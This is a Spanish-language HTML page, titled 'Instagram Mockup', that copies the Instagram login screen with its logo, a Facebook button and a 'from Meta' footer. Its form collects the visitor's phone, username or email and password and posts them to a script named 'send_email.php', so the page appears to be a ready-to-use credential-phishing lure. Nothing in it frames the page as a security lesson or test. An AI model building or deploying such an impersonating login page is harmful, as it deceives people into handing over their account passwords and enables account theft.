<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Mockup</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
        }
        .login-container img {
            margin-bottom: 20px;
        }
        .login-container button, .login-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
        }
        .login-container button {
            background-color: #0095f6;
            color: white;
            border: none;
            cursor: pointer;
        }
        .login-container .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .login-container .divider div {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .login-container .divider span {
            margin: 0 10px;
            color: #8e8e8e;
        }
        .login-container a {
            color: #0095f6;
            text-decoration: none;
        }
        .login-container .register {
            margin-top: 20px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" width="200">
        <button>Continuar con Facebook</button>
        <div class="divider">
            <div></div>
            <span>o</span>
            <div></div>
        </div>
        <form action="send_email.php" method="post">
            <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <a href="#">¿Olvidaste tu contraseña?</a>
            <button type="submit">Iniciar sesión</button>
        </form>
        <div class="register">
            ¿No tienes una cuenta? <a href="#">Regístrate</a>
        </div>
    </div>
    <div class="footer">
        from <strong>Meta</strong>
    </div>
</body>
</html>
